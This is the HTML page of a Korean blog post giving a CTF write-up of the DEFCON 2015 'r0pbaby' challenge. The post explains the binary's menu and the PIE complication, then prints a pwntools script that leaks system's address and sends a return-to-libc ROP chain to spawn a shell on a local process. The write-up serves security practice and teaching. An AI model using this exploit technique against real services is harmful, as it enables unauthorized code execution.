@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+
+    
+
+    
+    <title>DEFCON 2015 r0pbaby | j0n9hyun</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="WriteUps">
+    
+    <meta name="description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   r0pbaby Binary File  [바이너리 보호기법 확인]   [실행 화면 메뉴]  1번 진입시, libc">
+<meta name="keywords" content="WriteUps">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DEFCON 2015 r0pbaby">
+<meta property="og:url" content="http://j0n9hyun.github.io/2019/02/18/r0pbaby/index.html">
+<meta property="og:site_name" content="j0n9hyun">
+<meta property="og:description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   r0pbaby Binary File  [바이너리 보호기법 확인]   [실행 화면 메뉴]  1번 진입시, libc">
+<meta property="og:locale" content="ko">
+<meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58147435-6bad4680-7c95-11e9-96ca-576020aa52ce.PNG">
+<meta property="og:updated_time" content="2019-05-22T04:38:42.616Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DEFCON 2015 r0pbaby">
+<meta name="twitter:description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   r0pbaby Binary File  [바이너리 보호기법 확인]   [실행 화면 메뉴]  1번 진입시, libc">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58147435-6bad4680-7c95-11e9-96ca-576020aa52ce.PNG">
+    
+	<link rel="canonical" href="http://j0n9hyun.github.io/2019/02/18/r0pbaby/">
+
+    
+
+    
+        <link rel="icon" href="https://favicon-generator.org/favicon-generator/htdocs/favicons/2015-01-14/318ab48694395838406763908d9a1dad.ico">
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+	<link rel="stylesheet" type="text/css" href>
+	<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">	
+	<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/3.3.1/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+    
+
+
+</head>
+</html>
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+					<a href="/" style="font-size:40px;color:#fff; font-weight:bold; font-style: italic;text-decoration: none;">j0n9hyun's Blog</a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Script/">Script</a></li></ul></li></ul>
+                                    
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="https://about.me/j0n9hyun">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="검색">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="입력">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '포스트',
+            PAGES: 'Pages',
+            CATEGORIES: '카테고리',
+            TAGS: '태그',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/WriteUps/">WriteUps</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/WriteUps/Pwn/">Pwn</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-r0pbaby" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        DEFCON 2015 r0pbaby
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2019/02/18/r0pbaby/" class="article-date">
+            <time datetime="2019-02-18T10:07:00.000Z" itemprop="datePublished">2019-02-18</time>
+        </a>
+    </div>
+
+		
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/WriteUps/">WriteUps</a>
+    </div>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <style>
+  img.border-shadow{
+    border:1px solid #888888;
+    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+</style>
+<h2 id="r0pbaby"><a class="markdownIt-Anchor" href="#r0pbaby"></a> r0pbaby</h2>
+<p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3205617/r0pbaby.zip" target="_blank" rel="noopener">Binary File</a></p>
+<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147435-6bad4680-7c95-11e9-96ca-576020aa52ce.PNG">
+<center><small>[바이너리 보호기법 확인]</small></center>
+<br>
+<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147436-6cde7380-7c95-11e9-9ad8-299b2b6e15d3.PNG">
+<center><small>[실행 화면 메뉴]</small></center>
+<blockquote>
+<p>1번 진입시, libc의 주소를 알려준다. 하지만 확인해보니 실제 libc 주소는 아니었다.</p>
+</blockquote>
+<blockquote>
+<p>2번 진입시, symbol 입력란이 추가로 뜨는데 여기서 system 함수의 주소를 알려준다.</p>
+</blockquote>
+<blockquote>
+<p>3번 진입시, 최대 1024 바이트까지 버퍼를 보낼 수 있다. 우리가 최종적으로 페이로드를 보내는 곳이다.</p>
+</blockquote>
+<br>
+<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58147610-600e4f80-7c96-11e9-8101-128c723e35aa.PNG">
+<center><small>[system 함수 주소]</small></center>
+<p>libc 주소는 달랐는데 system 주소는 동일하다. 고로 바로 recv 받아서 사용하면 된다. 이후부터는 오프셋 연산을 해주고 RTL 하면 되는데 익스가 안된다…여기서 은근히 시간을 많이 잡아먹었다. 생각해보니 PIE가 걸렸다는 점을 간과하고 있었던 것이다. <strong>PIE</strong>가 걸려있으면 실행할 때마다 가젯 주소가 계속 바뀌기 때문에 libc의 pop rdi ret을 가져와서 오프셋 연산을 해야 한다. 3번을 IDA로 확인하면 buffer를 savage라는 곳에다가 옮기는데 이 savage의 위치는 고맙게도 rbp+0h 에 있다. 즉, 바로 버퍼의 바로 뒤에 위치해 있다는 소리다. 고로 buf + sfp[rbp+0h] + RTL[binsh+system]이 들어갈 최종 페이로드가 된다. 이후부터는 스무스하게 슥삭 진행하면 익스 성공!</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./r0pbaby'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">pr = <span class="number">0x21102</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"2"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"system"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">system_addr = int(r.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = system_addr - system_offset</span><br><span class="line">pr_addr = libc_base + pr</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"3"</span>)</span><br><span class="line">r.sendline(<span class="string">"32"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pr_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<center><small>[Exploit Code]</small></center>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="http://j0n9hyun.github.io/2019/02/18/r0pbaby/" data-id="cjvyqtedl000nglfp6p7mejvv" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "j0n9hyun"
+        },
+        "headline": "DEFCON 2015 r0pbaby",
+        "image": "http://j0n9hyun.github.iohttps://user-images.githubusercontent.com/16969364/58147435-6bad4680-7c95-11e9-96ca-576020aa52ce.PNG",
+        "keywords": "WriteUps",
+        "genre": "WriteUps Pwn",
+        "datePublished": "2019-02-18",
+        "dateCreated": "2019-02-18",
+        "dateModified": "2019-05-22",
+        "url": "http://j0n9hyun.github.io/2019/02/18/r0pbaby/",
+        "description": "
+  img.border-shadow{
+    border:1px solid #888888;
+    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+
+ r0pbaby
+Binary File
+
+[바이너리 보호기법 확인]
+
+
+[실행 화면 메뉴]
+
+1번 진입시, libc"
+        "wordCount": 294
+    }
+</script>
+
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>정보:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="chrome" href="https://ctf.j0n9hyun.xyz" target="_blank" rel="noopener">
+                        <i class="icon fa fa-chrome"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="facebook" href="https://www.facebook.com/j0n9hyun" target="_blank" rel="noopener">
+                        <i class="icon fa fa-facebook"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/j0n9hyun/CTF" target="_blank" rel="noopener">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2019/02/19/betting/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">다음 글</strong>
+        <p class="article-nav-title">
+        
+            CODEGATE 2018 betting
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/2019/02/15/pwnstart/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">이전 글</strong>
+        <p class="article-nav-title">TRUST CTF 2019 start</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">최근 글</h3>
+        <div class="widget">
+            <ul id="recent-post" class="no-thumbnail">
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/WriteUps/">WriteUps</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/WriteUps/Script/">Script</a></p>
+                            <p class="item-title"><a href="/2019/05/05/doesnt_contain_k_integer/" class="title">ALLMN CTF 2019 Doesn&#39;t contain K integer</a></p>
+                            <p class="item-date"><time datetime="2019-05-04T17:06:00.000Z" itemprop="datePublished">2019-05-05</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Theory/">Theory</a></p>
+                            <p class="item-title"><a href="/2019/04/01/rtc_theory/" class="title">Reutrn-to-Csu Theory</a></p>
+                            <p class="item-date"><time datetime="2019-04-01T05:00:00.000Z" itemprop="datePublished">2019-04-01</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">카테고리</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Theory/">Theory</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/">WriteUps</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Foren/">Foren</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Misc/">Misc</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Pwn/">Pwn</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Script/">Script</a><span class="category-list-count">1</span></li></ul></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">태그</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0CTF/">0CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ALLMN/">ALLMN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CodeGate/">CodeGate</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FREE/">FREE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NEWSECU/">NEWSECU</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Securinets/">Securinets</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TRUST/">TRUST</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/">Theory</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUps/">WriteUps</a><span class="tag-list-count">18</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">링크</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="https://ctf.j0n9hyun.xyz">HackCTF</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <p>&copy; 2019 j0n9hyun</p>
+                <p>Team <a href="https://ctf.j0n9hyun.xyz" target="_blank">Defenit</a>.</p>
+            </div>
+            <div class="footer-plugins">
+              
+    
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+        
+    
+    <script>
+    var disqus_shortname = 'j0n9hyun';
+    
+    
+    var disqus_url = 'http://j0n9hyun.github.io/2019/02/18/r0pbaby/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
